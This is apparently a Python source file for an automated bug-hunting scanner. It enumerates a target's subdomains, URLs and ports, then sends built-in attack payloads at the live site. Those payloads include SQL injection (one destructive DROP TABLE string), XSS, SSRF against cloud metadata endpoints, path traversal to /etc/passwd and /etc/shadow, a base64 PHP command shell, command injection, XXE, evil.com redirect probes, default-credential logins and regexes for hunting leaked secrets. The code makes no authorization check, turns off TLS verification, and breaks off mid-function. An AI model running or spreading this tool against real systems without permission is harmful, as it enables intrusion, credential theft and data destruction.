import subprocess, shutil, os, json, re, time, socket, ssl
import urllib.request, urllib.parse, urllib.error
from pathlib import Path
from datetime import datetime

OUTPUT_BASE = Path("recon")
OUTPUT_BASE.mkdir(exist_ok=True)

TOOLS_MAP = {
    "subfinder":   ["subfinder","-version"],
    "httpx":       ["httpx","-version"],
    "nuclei":      ["nuclei","-version"],
    "katana":      ["katana","-version"],
    "ffuf":        ["ffuf","-V"],
    "nmap":        ["nmap","--version"],
    "dalfox":      ["dalfox","version"],
    "gau":         ["gau","--version"],
    "dnsx":        ["dnsx","-version"],
    "sqlmap":      ["sqlmap","--version"],
    "nikto":       ["nikto","-Version"],
    "gobuster":    ["gobuster","version"],
    "amass":       ["amass","--version"],
    "whatweb":     ["whatweb","--version"],
    "arjun":       ["arjun","--help"],
    "curl":        ["curl","--version"],
    "feroxbuster": ["feroxbuster","--version"],
}

def check_tools():
    return {name: bool(shutil.which(cmd[0])) for name, cmd in TOOLS_MAP.items()}

def _run(cmd, timeout=180):
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, env=os.environ)
        return (r.stdout or "").strip()
    except subprocess.TimeoutExpired: return f"[timeout after {timeout}s]"
    except FileNotFoundError: return ""
    except Exception as e: return f"[error: {e}]"

def _http(url, method="GET", data=None, extra_headers=None, base_headers=None, timeout=10):
    try:
        all_hdrs = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120",
            "Accept": "*/*",
            **(base_headers or {}),
            **(extra_headers or {}),
        }
        req = urllib.request.Request(url, data=data, method=method, headers=all_hdrs)
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        body = resp.read(65536).decode("utf-8", "ignore")
        return resp.status, body, dict(resp.headers)
    except urllib.error.HTTPError as e:
        try: body = e.read(8192).decode("utf-8","ignore")
        except: body = ""
        return e.code, body, {}
    except Exception:
        return 0, "", {}

# ══════════════════════════════════════════════════════════
# RECON ENGINE
# ══════════════════════════════════════════════════════════
def recon(target, progress_cb=None):
    d = OUTPUT_BASE / target
    d.mkdir(parents=True, exist_ok=True)
    steps = {}
    p = progress_cb or (lambda x: None)

    # 1. Subdomain enumeration
    p(f"[recon] Subdomain enumeration for {target}...")
    subs = set([target])

    if shutil.which("subfinder"):
        p("[recon] Running subfinder (passive + active)...")
        out = _run(["subfinder","-d",target,"-silent","-all","-t","100"], timeout=180)
        for l in out.splitlines():
            if l.strip() and "." in l: subs.add(l.strip().lower())

    if shutil.which("amass"):
        p("[recon] Running amass passive...")
        out = _run(["amass","enum","-passive","-d",target,"-timeout","90"], timeout=150)
        for l in out.splitlines():
            if l.strip() and "." in l: subs.add(l.strip().lower())

    if shutil.which("dnsx") and len(subs) > 1:
        p(f"[recon] DNS resolving {len(subs)} subdomains...")
        sf = d/"subs_raw.txt"
        sf.write_text("\n".join(sorted(subs)))
        out = _run(["dnsx","-l",str(sf),"-silent","-resp","-a"], timeout=120)
        for l in out.splitlines():
            parts = l.split()
            if parts: subs.add(parts[0].strip("[]").lower())

    subs_list = sorted(subs)
    (d/"subdomains.txt").write_text("\n".join(subs_list))
    steps["subdomains"] = subs_list
    p(f"[recon] Found {len(subs_list)} subdomains")

    # 2. Live host probing
    p(f"[recon] Probing {len(subs_list)} hosts...")
    live_hosts = ""
    technologies = {}

    if shutil.which("httpx"):
        out = _run(["httpx","-l",str(d/"subdomains.txt"),"-silent",
                   "-status-code","-title","-tech-detect","-web-server",
                   "-follow-redirects","-threads","100","-timeout","10",
                   "-json"], timeout=360)
        parsed = []
        for line in out.splitlines():
            try:
                j = json.loads(line)
                parsed.append(j)
                if j.get("tech"): technologies[j.get("url","")] = j.get("tech",[])
            except:
                if line.strip(): parsed.append({"url": line.strip()})
        (d/"live_hosts.json").write_text(json.dumps(parsed, indent=2))
        live_hosts = "\n".join([
            f"{j.get('url','')} [{j.get('status-code','')}] {j.get('title','')} {','.join(j.get('tech',[]))}"
            for j in parsed
        ])
        (d/"live_hosts.txt").write_text(live_hosts)

    steps["live_hosts"] = live_hosts
    steps["technologies"] = technologies
    p(f"[recon] {len(live_hosts.splitlines())} live hosts")

    # 3. URL crawling
    p("[recon] Crawling URLs...")
    urls = set()

    if shutil.which("katana"):
        for proto in ["https","http"]:
            out = _run(["katana","-u",f"{proto}://{target}","-silent",
                       "-depth","5","-js-crawl","-jc","-aff",
                       "-concurrency","20","-timeout","15",
                       "-field","url"], timeout=180)
            for l in out.splitlines():
                if l.strip() and l.startswith("http"): urls.add(l.strip())

    if not urls and shutil.which("gau"):
        out = _run(["gau","--subs",target,"--threads","10",
                   "--blacklist","png,jpg,gif,css,woff,svg,ico"], timeout=120)
        for l in out.splitlines():
            if l.strip() and l.startswith("http"): urls.add(l.strip())

    urls_list = sorted(urls)
    if urls_list: (d/"urls.txt").write_text("\n".join(urls_list))
    steps["urls"] = urls_list
    p(f"[recon] {len(urls_list)} URLs crawled")

    # 4. Nuclei passive scan
    p("[recon] Nuclei template scan...")
    nuclei_out = ""
    if shutil.which("nuclei"):
        out = _run(["nuclei","-l",str(d/"subdomains.txt"),
                   "-severity","critical,high,medium","-silent",
                   "-timeout","10","-bulk-size","50",
                   "-concurrency","50","-rate-limit","300"], timeout=600)
        nuclei_out = out
        (d/"nuclei.txt").write_text(out)
    steps["nuclei"] = nuclei_out
    p(f"[recon] Nuclei: {len([l for l in nuclei_out.splitlines() if l.strip()])} findings")

    # 5. JS secret hunting
    p("[recon] Hunting secrets in JS files...")
    js_secrets = []
    js_urls = [u for u in urls_list if ".js" in u and "?" not in u][:25]
    secret_patterns = {
        "AWS Access Key":    r'AKIA[0-9A-Z]{16}',
        "Google API Key":    r'AIza[0-9A-Za-z\-_]{35}',
        "GitHub Token":      r'gh[pousr]_[0-9a-zA-Z]{36}',
        "Slack Token":       r'xox[baprs]-[0-9a-zA-Z]{10,48}',
        "JWT Token":         r'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}',
        "Private Key":       r'-----BEGIN\s+(?:RSA|EC|DSA|OPENSSH)\s+PRIVATE\s+KEY',
        "Password in code":  r'(?:password|passwd|pwd)\s*[=:]\s*["\'][^"\']{6,}["\']',
        "API Key generic":   r'api[_-]?key\s*[=:]\s*["\'][a-zA-Z0-9_\-]{16,}["\']',
        "DB Connection":     r'(?:mongodb|mysql|postgres|redis)://[^\s"\'<>]{10,}',
        "Bearer Token":      r'bearer\s+[a-zA-Z0-9\-._~+/]{20,}',
        "Secret Key":        r'secret[_-]?key\s*[=:]\s*["\'][^"\']{8,}["\']',
        "Stripe Key":        r'sk_live_[0-9a-zA-Z]{24}',
    }
    for js_url in js_urls:
        try:
            status, content, _ = _http(js_url, timeout=8)
            if status == 200 and content:
                for name, pattern in secret_patterns.items():
                    ms = re.findall(pattern, content, re.IGNORECASE)
                    for m in ms[:2]:
                        js_secrets.append({"type":name,"url":js_url,"match":str(m)[:80]})
        except: pass
    steps["js_secrets"] = js_secrets
    if js_secrets: p(f"[recon] ⚠ {len(js_secrets)} secrets found in JS!")

    # 6. Port scan
    p("[recon] Quick port scan...")
    nmap_out = ""
    if shutil.which("nmap"):
        nmap_out = _run(["nmap","-T4","--open",
                        "-p","21,22,23,25,53,80,443,445,3306,3389,5432,5900,6379,8080,8443,8888,9200,27017,50000",
                        "--host-timeout","30s",target], timeout=90)
        (d/"nmap.txt").write_text(nmap_out)
    steps["nmap"] = nmap_out

    p("[recon] ✓ Recon complete!")
    return {"target":target,"steps":steps,"timestamp":datetime.now().isoformat()}

# ══════════════════════════════════════════════════════════
# ULTRA HUNT ENGINE — 25 VULNERABILITY CLASSES
# ══════════════════════════════════════════════════════════
def hunt(target, headers="", progress_cb=None):
    d = OUTPUT_BASE / target
    d.mkdir(parents=True, exist_ok=True)
    findings = []
    p = progress_cb or (lambda x: None)

    sub_file = d/"subdomains.txt"
    url_file  = d/"urls.txt"
    subs  = sub_file.read_text().splitlines() if sub_file.exists() else [target]
    urls  = url_file.read_text().splitlines()  if url_file.exists() else []
    base  = f"https://{target}"

    header_dict = {}
    header_args = []
    if headers:
        for h in headers.strip().splitlines():
            h = h.strip()
            if ":" in h:
                k, v = h.split(":", 1)
                header_dict[k.strip()] = v.strip()
                header_args += ["-H", h]

    def hget(url, extra={}):
        return _http(url, extra_headers=extra, base_headers=header_dict)

    def hpost(url, data, ct="application/x-www-form-urlencoded"):
        if isinstance(data, str): data = data.encode()
        return _http(url, method="POST", data=data,
                     extra_headers={"Content-Type": ct}, base_headers=header_dict)

    get_urls = [u for u in urls if "?" in u]

    # ──────────────────────────────────────────
    # 1. SQL INJECTION — 4 detection methods
    # ──────────────────────────────────────────
    p("[hunt] 1/25 — SQL Injection...")
    sql_errors = [
        "you have an error in your sql syntax",
        "unclosed quotation mark",
        "quoted string not properly terminated",
        "sql syntax","mysql_fetch","pg_query","sqlite_",
        "ora-01756","microsoft jet database","odbc sql server driver",
        "db2 sql error","sybase","invalid query","sql server error",
    ]
    sqli_payloads = [
        ("'", "error-based"),
        ('" OR "1"="1', "auth bypass"),
        ("' OR 1=1--", "auth bypass"),
        ("1' AND SLEEP(5)--", "time-based"),
        ("' UNION SELECT NULL,NULL--", "union"),
        ("'; DROP TABLE users--", "destructive"),
        ("1 AND 1=2 UNION SELECT 1,user(),3--", "union info"),
    ]

    if shutil.which("sqlmap") and get_urls:
        p("[hunt]   → sqlmap scan...")
        out = _run(["sqlmap","-u",get_urls[0],"--batch","--level=3",
                   "--risk=2","--technique=BEUST","--threads=5",
                   "--timeout=15","--forms","--crawl=2",
                   "--output-dir=/tmp/sqlmap_astra","--quiet"]+
                  [item for pair in (["-H",h] for h in header_dict.items()
                   if h) for item in pair], timeout=360)
        if any(x in out.lower() for x in ["vulnerable","injection found","parameter"]):
            findings.append({"type":"SQL Injection (SQLMap)","severity":"critical",
                            "url":get_urls[0],"detail":out[:500],
                            "impact":"Full DB access, auth bypass, data exfiltration"})
            p("[hunt]   ⚠ SQLMap confirmed SQLi!")

    for url in get_urls[:12]:
        for payload, ptype in sqli_payloads[:5]:
            test_url = re.sub(r'=([^&]*)', lambda m: f'={urllib.parse.quote(payload)}', url, count=1)
            s, body, _ = hget(test_url)
            if any(e in body.lower() for e in sql_errors):
                findings.append({"type":f"SQL Injection ({ptype})","severity":"critical",
                                "url":test_url,"payload":payload,
                                "detail":"SQL error message in response",
                                "impact":"Database compromise, data theft, potential RCE"})
                p(f"[hunt]   ⚠ SQLi error-based: {url[:55]}")
                break

    # ──────────────────────────────────────────
    # 2. XSS — Reflected, Stored, DOM
    # ──────────────────────────────────────────
    p("[hunt] 2/25 — Cross-Site Scripting (XSS)...")
    if shutil.which("dalfox") and get_urls:
        p("[hunt]   → dalfox scan...")
        uf = d/"xss_targets.txt"
        uf.write_text("\n".join(get_urls[:30]))
        out = _run(["dalfox","file",str(uf),"--silence","--no-spinner",
                   "--timeout","15","--delay","50"]+header_args, timeout=360)
        for line in out.splitlines():
            if any(x in line for x in ["POC","VULN","[V]","[G]","[R]"]):
                findings.append({"type":"XSS (DalFox Confirmed)","severity":"high",
                                "detail":line[:400],
                                "impact":"Session hijacking, credential theft, defacement"})
                p(f"[hunt]   ⚠ XSS: {line[:70]}")

    xss_payloads = [
        "<script>alert(1)</script>",
        "'\"><img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "javascript:alert(1)",
        "<details open ontoggle=alert(1)>",
        "'-alert(1)-'",
        "{{constructor.constructor('alert(1)')()}}",
    ]
    for url in get_urls[:15]:
        for pl in xss_payloads[:4]:
            test_url = re.sub(r'=([^&]*)', lambda m: f'={urllib.parse.quote(pl)}', url, count=1)
            s, body, hdrs = hget(test_url)
            ct = hdrs.get("Content-Type","")
            if pl in body and ("html" in ct or not ct):
                findings.append({"type":"Reflected XSS","severity":"high",
                                "url":test_url,"payload":pl,
                                "detail":"Payload reflected unescaped in HTML response",
                                "impact":"Account takeover, session hijacking, credential theft"})
                p(f"[hunt]   ⚠ Reflected XSS: {url[:55]}")
                break

    # ──────────────────────────────────────────
    # 3. SSRF
    # ──────────────────────────────────────────
    p("[hunt] 3/25 — Server-Side Request Forgery (SSRF)...")
    ssrf_params = {"url","redirect","next","return","goto","dest","destination","link",
                  "src","source","callback","webhook","endpoint","host","target","to",
                  "proxy","forward","image","fetch","load","path","data","href","open"}
    ssrf_payloads = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/?recursive=true",
        "http://100.100.100.200/latest/meta-data/",
        "http://127.0.0.1:6379",
        "file:///etc/passwd",
        "http://[::1]:22",
        "dict://127.0.0.1:6379/INFO",
    ]
    ssrf_indicators = ["ami-id","instance-id","169.254","metadata","computeMetadata",
                      "root:x:0","daemon:","redis_version","SSH-","iam"]

    for url in urls[:40]:
        parsed = urllib.parse.urlparse(url)
        params = dict(urllib.parse.parse_qsl(parsed.query))
        for param in params:
            if param.lower() in ssrf_params or any(k in param.lower() for k in ssrf_params):
                for pl in ssrf_payloads[:4]:
                    new_params = dict(params)
                    new_params[param] = pl
                    new_q = urllib.parse.urlencode(new_params)
                    test_url = parsed._replace(query=new_q).geturl()
                    s, body, _ = hget(test_url)
                    if any(ind in body for ind in ssrf_indicators):
                        findings.append({"type":"SSRF","severity":"critical",
                                        "url":test_url,"param":param,"payload":pl,
                                        "detail":f"SSRF confirmed via '{param}'",
                                        "impact":"Cloud metadata theft, internal network access, credential exposure"})
                        p(f"[hunt]   ⚠ SSRF via '{param}'!")
                        break

    # ──────────────────────────────────────────
    # 4. Open Redirect
    # ──────────────────────────────────────────
    p("[hunt] 4/25 — Open Redirects...")
    redirect_params = {"redirect","url","next","return","goto","dest","target","rurl",
                      "redirect_uri","redirect_url","return_url","returnto","r","ref",
                      "continue","returnUrl","successUrl","failUrl","after_login"}
    redirect_payloads = [
        "//evil.com", "https://evil.com",
        "///evil.com", "/\\evil.com",
        "https:evil.com", "//evil%2ecom",
        "\nhttps://evil.com", "javascript:alert(1)",
    ]

    for url in urls[:60]:
        parsed = urllib.parse.urlparse(url)
        params = dict(urllib.parse.parse_qsl(parsed.query))
        for param in params:
            if param.lower() in redirect_params or any(k in param.lower() for k in redirect_params):
                for pl in redirect_payloads[:4]:
                    new_params = dict(params)
                    new_params[param] = pl
                    test_url = parsed._replace(query=urllib.parse.urlencode(new_params)).geturl()
                    s, body, hdrs = hget(test_url)
                    loc = hdrs.get("Location","")
                    if "evil.com" in loc or "javascript:" in loc:
                        findings.append({"type":"Open Redirect","severity":"medium",
                                        "url":test_url,"payload":pl,
                                        "detail":f"Redirects to: {loc}",
                                        "impact":"Phishing, OAuth token theft, credential harvesting"})
                        p(f"[hunt]   ⚠ Open Redirect via '{param}'")
                        break

    # ──────────────────────────────────────────
    # 5. CORS Misconfiguration
    # ──────────────────────────────────────────
    p("[hunt] 5/25 — CORS Misconfiguration...")
    live_urls = [base]
    if (d/"live_hosts.txt").exists():
        live_urls += [l.split()[0] for l in (d/"live_hosts.txt").read_text().splitlines() if l.strip()][:10]

    for url in live_urls[:12]:
        for origin in [f"https://evil.com","null",f"https://evil.{target}",f"https://{target}.evil.com"]:
            s, body, hdrs = hget(url, {"Origin": origin})
            acao = hdrs.get("Access-Control-Allow-Origin","")
            acac = hdrs.get("Access-Control-Allow-Credentials","")
            if acao == origin or (acao and acac == "true"):
                findings.append({"type":"CORS Misconfiguration","severity":"high",
                                "url":url,"origin_tested":origin,
                                "detail":f"ACAO: {acao} | ACAC: {acac}",
                                "impact":"Cross-origin data theft, auth bypass, account takeover"})
                p(f"[hunt]   ⚠ CORS misconfiguration: {url[:55]}")
                break

    # ──────────────────────────────────────────
    # 6. Path Traversal / LFI
    # ──────────────────────────────────────────
    p("[hunt] 6/25 — Path Traversal / LFI...")
    path_params = {"file","path","dir","page","include","load","template","module",
                  "conf","document","folder","root","pg","style","view","action",
                  "name","ref","read","download","display","show","get","fetch"}
    lfi_payloads = [
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "/etc/passwd","/etc/shadow","/proc/self/environ",
        "../../../../windows/win.ini",
        "php://filter/convert.base64-encode/resource=/etc/passwd",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
    ]
    lfi_indicators = ["root:x:0:0","daemon:x","bin:x","/bin/bash","/sbin/nologin",
                     "[extensions]","boot loader","WINDOWS","System32","document_root"]

    for url in get_urls[:30]:
        parsed = urllib.parse.urlparse(url)
        params = dict(urllib.parse.parse_qsl(parsed.query))
        for param in params:
            if param.lower() in path_params or any(k in param.lower() for k in path_params):
                for pl in lfi_payloads[:5]:
                    new_params = dict(params)
                    new_params[param] = pl
                    test_url = parsed._replace(query=urllib.parse.urlencode(new_params)).geturl()
                    s, body, _ = hget(test_url)
                    if any(ind in body for ind in lfi_indicators):
                        findings.append({"type":"Path Traversal / LFI","severity":"critical",
                                        "url":test_url,"param":param,"payload":pl,
                                        "detail":"Sensitive file content returned",
                                        "impact":"Credential exposure, config theft, RCE potential"})
                        p(f"[hunt]   ⚠ LFI via '{param}'!")
                        break

    # ──────────────────────────────────────────
    # 7. Exposed Sensitive Paths
    # ──────────────────────────────────────────
    p("[hunt] 7/25 — Exposed sensitive files & endpoints...")
    sensitive_paths = [
        # Environment & Config
        "/.env","/.env.local","/.env.production","/.env.staging","/.env.backup",
        "/.env.example","/.env.dev","/.env.test","/.env.old",
        "/config.php","/config.js","/config.json","/config.yml","/config.yaml",
        "/configuration.php","/.htpasswd","/.htaccess","/web.config",
        "/application.properties","/.aws/credentials","/.ssh/id_rsa",
        # CMS config
        "/wp-config.php","/wp-config.php.bak","/wp-config.php.save",
        # Git & VCS
        "/.git/HEAD","/.git/config","/.git/COMMIT_EDITMSG",
        "/.git/refs/heads/main","/.git/refs/heads/master",
        "/.gitignore","/.svn/entries","/.hg/hgrc",
        # Backup files
        "/backup.zip","/backup.tar.gz","/backup.sql","/backup.db",
        "/db.sql","/dump.sql","/database.sql","/database.db",
        "/backup.bak","/site.zip","/www.zip","/app.zip",
        # Admin panels
        "/admin","/admin/","/administrator","/wp-admin",
        "/phpmyadmin","/phpMyAdmin","/pma","/cpanel",
        "/controlpanel","/manager","/console","/shell",
        # API docs
        "/api/swagger.json","/swagger.json","/swagger-ui.html",
        "/api/openapi.json","/openapi.yaml","/v1/api-docs",
        "/v2/api-docs","/v3/api-docs","/api-docs",
        # GraphQL
        "/graphql","/graphiql","/__graphql","/api/graphql",
        # Spring Boot Actuator (RCE risk!)
        "/actuator","/actuator/health","/actuator/env",
        "/actuator/beans","/actuator/heapdump","/actuator/mappings",
        "/actuator/logfile","/actuator/httptrace","/actuator/sessions",
        # Debug/monitoring
        "/metrics","/health","/info","/trace","/debug",
        "/_debug","/__debug__","/_profiler","/server-status","/server-info",
        # PHP
        "/phpinfo.php","/info.php","/test.php","/debug.php","/error.php",
        # Logs
        "/debug.log","/error.log","/laravel.log","/app.log",
        "/access.log","/var/log/apache2/access.log",
        # Package files (dependency info)
        "/package.json","/package-lock.json","/composer.json",
        "/requirements.txt","/.DS_Store","/Gemfile","/yarn.lock",
        # Security.txt
        "/.well-known/security.txt","/.well-known",
        # Cloud
        "/latest/meta-data","/metadata/v1",
        # Common upload paths
        "/uploads","/files","/media","/static/uploads",
    ]

    if shutil.which("httpx"):
        pf = d/"sensitive_paths.txt"
        pf.write_text("\n".join([base+p for p in sensitive_paths]))
        out = _run(["httpx","-l",str(pf),"-silent","-status-code",
                   "-content-length","-title","-mc","200,201,301,302",
                   "-threads","80","-timeout","8"]+header_args, timeout=180)
        for line in out.splitlines():
            if not line.strip(): continue
            sev = "critical" if any(x in line.lower() for x in [
                ".env","aws/credentials","ssh/id_rsa","actuator/heapdump","actuator/env"
            ]) else "high" if any(x in line.lower() for x in [
                "git","config","backup","sql","admin","phpinfo","wp-config","actuator"
            ]) else "medium"
            findings.append({"type":"Exposed Sensitive Path","severity":sev,
                            "detail":line.strip(),
                            "impact":"Info disclosure, credential exposure, auth bypass"})
            p(f"[hunt]   ⚠ Exposed: {line[:70]}")
    else:
        for path in sensitive_paths[:40]:
            s, body, _ = hget(base + path)
            if s == 200 and len(body) > 20:
                findings.append({"type":"Exposed Sensitive Path","severity":"high",
                                "url":base+path,"detail":f"HTTP 200 - {len(body)} bytes",
                                "impact":"Information disclosure"})

    # ──────────────────────────────────────────
    # 8. IDOR
    # ──────────────────────────────────────────
    p("[hunt] 8/25 — IDOR / Broken Object Level Auth...")
    idor_patterns = [
        r'/users?/(\d+)', r'/accounts?/(\d+)', r'/profiles?/(\d+)',
        r'/orders?/(\d+)', r'/documents?/(\d+)', r'/files?/(\d+)',
        r'/invoices?/(\d+)', r'/tickets?/(\d+)', r'/reports?/(\d+)',
        r'/messages?/(\d+)', r'/payments?/(\d+)', r'/transactions?/(\d+)',
        r'/api/v\d+/\w+/(\d+)', r'/\w+/([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})',
        r'/\w+/([0-9a-f]{24})',  # MongoDB ObjectID
    ]
    candidates = []
    for url in urls:
        for patt in idor_patterns:
            m = re.search(patt, url, re.I)
            if m: candidates.append({"url":url,"id":m.group(1)})

    for c in candidates[:12]:
        url, cur_id = c["url"], c["id"]
        test_ids = []
        if cur_id.isdigit():
            n = int(cur_id)
            test_ids = [str(n+1),str(n-1),"1","2","0"]
        else:
            test_ids = ["1","2","test","admin"]
        for tid in test_ids[:3]:
            turl = url.replace(f"/{cur_id}", f"/{tid}", 1)
            s1, b1, _ = hget(url)
            s2, b2, _ = hget(turl)
            if s1==200 and s2==200 and b1!=b2 and len(b2)>100:
                findings.append({"type":"Potential IDOR","severity":"high",
                                "url":turl,"original":url,
                                "detail":f"ID {cur_id}→{tid}: different valid 200 responses ({len(b1)}→{len(b2)} bytes)",
                                "impact":"Unauthorized access to other users' data, account takeover"})
                p(f"[hunt]   ⚠ IDOR: {url[:55]}")
                break

    # ──────────────────────────────────────────
    # 9. Authentication & Session Issues
    # ──────────────────────────────────────────
    p("[hunt] 9/25 — Authentication / Session issues...")
    auth_kw = {"login","auth","signin","admin","logout","register","reset","forgot","password","session","token"}
    auth_urls = [u for u in urls if any(k in u.lower() for k in auth_kw)]

    default_creds = [
        {"username":"admin","password":"admin"},
        {"username":"admin","password":"password"},
        {"username":"admin","password":"123456"},
        {"username":"root","password":"root"},
        {"email":"admin@admin.com","password":"admin"},
        {"user":"admin","pass":"admin"},
    ]
    for url in auth_urls[:5]:
        if "login" in url.lower() or "signin" in url.lower():
            for creds in default_creds[:3]:
                s, body, hdrs = hpost(url, urllib.parse.urlencode(creds))
                if any(x in body.lower() for x in ["dashboard","logout","welcome","profile","success"]):
                    findings.append({"type":"Default Credentials","severity":"critical",
                                    "url":url,"creds":str(creds),
                                    "detail":f"Login succeeded with {creds}",
                                    "impact":"Full admin access"})
                    p(f"[hunt]   ⚠ Default creds work at {url[:55]}!")

    # ──────────────────────────────────────────
    # 10. Missing Security Headers
    # ──────────────────────────────────────────
    p("[hunt] 10/25 — Security headers audit...")
    s, body, hdrs = hget(base)
    hdrs_lower = {k.lower():v for k,v in hdrs.items()}
    security_headers = {
        "strict-transport-security": ("HSTS missing","high","SSL stripping, MITM attacks"),
        "content-security-policy":   ("CSP missing","high","XSS, data injection attacks"),
        "x-content-type-options":    ("MIME sniffing","medium","MIME confusion attacks"),
        "x-frame-options":           ("Clickjacking","medium","UI redressing attacks"),
        "referrer-policy":           ("Referrer leakage","low","Data leakage via Referer header"),
        "permissions-policy":        ("Permissions-Policy missing","low","Uncontrolled browser features"),
    }
    missing_hdrs = []
    for hdr, (issue, sev, impact) in security_headers.items():
        if hdr not in hdrs_lower:
            missing_hdrs.append(f"{hdr} — {issue}")
    if missing_hdrs:
        findings.append({"type":"Missing Security Headers","severity":"medium",
                        "url":base,"detail":"\n".join(missing_hdrs),
                        "impact":"Multiple attack vectors: " + ", ".join([m.split("—")[0].strip() for m in missing_hdrs])})

    # ──────────────────────────────────────────
    # 11. Command Injection
    # ──────────────────────────────────────────
    p("[hunt] 11/25 — Command Injection / RCE...")
    cmdi_payloads = [
        ";id", "&id", "|id", "$(id)", "`id`",
        ";whoami", "%0aid", "\nid",
        ";cat /etc/passwd", "||ping -c1 127.0.0.1||",
        "|curl http://localhost:9999",
        "$(sleep 5)", "a;sleep 5",
    ]
    cmdi_indicators = ["uid=","gid=","root:x","daemon:","www-data","nobody","git","mysql"]

    for url in get_urls[:12]:
        for pl in cmdi_payloads[:5]:
            test_url = re.sub(r'=([^&]*)', lambda m: f'={urllib.parse.quote(pl)}', url, count=1)
            s, body, _ = hget(test_url)
            if any(ind in body for ind in cmdi_indicators):
                findings.append({"type":"Command Injection / RCE","severity":"critical",
                                "url":test_url,"payload":pl,
                                "detail":"OS command output in HTTP response",
                                "impact":"Complete server compromise, RCE, data exfiltration"})
                p(f"[hunt]   ⚠ RCE/Command Injection: {url[:55]}!")
                break

    # ──────────────────────────────────────────
    # 12. SSTI (Template Injection)
    # ──────────────────────────────────────────
    p("[hunt] 12/25 — Server-Side Template Injection (SSTI)...")
    ssti_tests = [
        ("{{7*7}}", "49", "Jinja2/Twig"),
        ("${7*7}", "49", "FreeMarker/Spring"),
        ("#{7*7}", "49", "Ruby ERB/Thymeleaf"),
        ("<%= 7*7 %>", "49", "Ruby/EJS"),
        ("{{7*'7'}}", "7777777", "Jinja2"),
        ("${{7*7}}", "49", "Spring/EL"),
        ("{7*7}", "49", "Generic"),
    ]
    for url in get_urls[:15]:
        for pl, expected, engine in ssti_tests:
            test_url = re.sub(r'=([^&]*)', lambda m: f'={urllib.parse.quote(pl)}', url, count=1)
            s, body, _ = hget(test_url)
            if expected in body and pl not in body.replace(expected,""):
                findings.append({"type":f"SSTI — {engine}","severity":"critical",
                                "url":test_url,"payload":pl,
                                "detail":f"Expression {pl} evaluated to {expected}",
                                "impact":"Remote code execution via template engine"})
                p(f"[hunt]   ⚠ SSTI ({engine}): {url[:55]}!")
                break

    # ──────────────────────────────────────────
    # 13. XXE Injection
    # ──────────────────────────────────────────
    p("[hunt] 13/25 — XXE Injection...")
    xxe_payloads = [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
    ]
    xml_urls = [u for u in urls if any(x in u.lower() for x in ["xml","api","soap","upload","import","export","parse"])]
    for url in xml_urls[:8]:
        for pl in xxe_payloads[:2]:
            s, body, _ = hpost(url, pl.encode(), ct="application/xml")
            if any(x in body for x in ["root:x:0","daemon:","127.0.0.1","ami-id"]):
                findings.append({"type":"XXE Injection","severity":"critical",
                                "url":url,"payload":pl[:80],
                                "detail":"File/SSRF content returned via XXE entity",
                                "impact":"File read, SSRF, potential RCE"})
                p(f"[hunt]   ⚠ XXE: {url[:55]}!")

    # ──────────────────────────────────────────
    # 14. Subdomain Takeover
    # ──────────────────────────────────────────
    p("[hunt] 14/25 — Subdomain Takeover...")
    takeover_sigs = {
        "GitHub Pages":  ["there isn't a github pages site here","for root, try setting up a custom domain"],
        "Heroku":        ["no such app","herokucdn.com/error-pages"],
        "AWS S3":        ["nosuchbucket","the specified bucket does not exist","nosuchkey"],
        "Shopify":       ["sorry, this shop is currently unavailable"],
        "Netlify":       ["not found - request id","page not found | netlify"],
        "Fastly":        ["fastly error: unknown domain","please check that this domain"],
        "Tumblr":        ["there's nothing here","whatever you were looking for doesn't currently exist"],
        "Zendesk":       ["help center closed","this help center no longer exists"],
        "Azure":         ["this web app is stopped","this azure web site is stopped"],
        "Surge.sh":      ["project not found"],
        "ReadTheDocs":   ["project with that id does not exist"],
        "Cargo":         ["if you're moving your domain away from cargo"],
    }
    for sub in subs[:40]:
        for proto in ["https","http"]:
            s, body, _ = hget(f"{proto}://{sub}")
            body_l = body.lower()
            for platform, sigs in takeover_sigs.items():
                if any(sig.lower() in body_l for sig in sigs):
                    findings.append({"type":"Subdomain Takeover","severity":"high",
                                    "url":f"{proto}://{sub}","platform":platform,
                                    "detail":f"Dangling {platform} DNS record — takeover possible",
                                    "impact":"Full subdomain control, phishing, session theft"})
                    p(f"[hunt]   ⚠ Takeover: {sub} → {platform}")
                    break

    # ──────────────────────────────────────────
    # 15. GraphQL Vulnerabilities
    # ──────────────────────────────────────────
    p("[hunt] 15/25 — GraphQL vulnerabilities...")
    gql_paths = ["/graphql","/api/graphql","/graphiql","/v1/graphql","/gql","/query","/api/gql"]
    introspection = json.dumps({"query":"{__schema{types{name kind fields{name type{name kind}}}}}"})
    batching_test = json.dumps([{"query":"{ __typename }"}]*10)

    for gpath in gql_paths:
        url = base + gpath
        # Introspection
        s, body, _ = hpost(url, introspection.encode(), ct="application/json")
        if "__schema" in body or '"types"' in body:
            findings.append({"type":"GraphQL Introspection Enabled","severity":"medium",
                            "url":url,"detail":"Full schema exposed — type names, fields, mutations visible",
                            "impact":"API reconnaissance, targeted injection, mutation abuse"})
            p(f"[hunt]   ⚠ GraphQL introspection: {url}")
        # Batching DoS
        s2, body2, _ = hpost(url, batching_test.encode(), ct="application/json")
        if s2 == 200 and '"data"' in body2:
